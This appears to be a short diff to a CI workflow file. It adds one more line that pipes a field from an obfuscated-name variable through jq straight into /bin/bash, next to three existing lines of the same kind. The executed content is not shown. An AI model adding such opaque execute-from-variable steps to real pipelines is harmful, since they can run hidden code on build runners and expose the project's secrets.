@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$b13" | jq -r .b4 | /bin/bash
           echo $z45393 | jq -r .hmlv2 | /bin/bash
           echo $kf8 | jq -r .onfbu7 | /bin/bash
+          printf '%s' "$ju11854" | jq -r .mwnrt7846 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
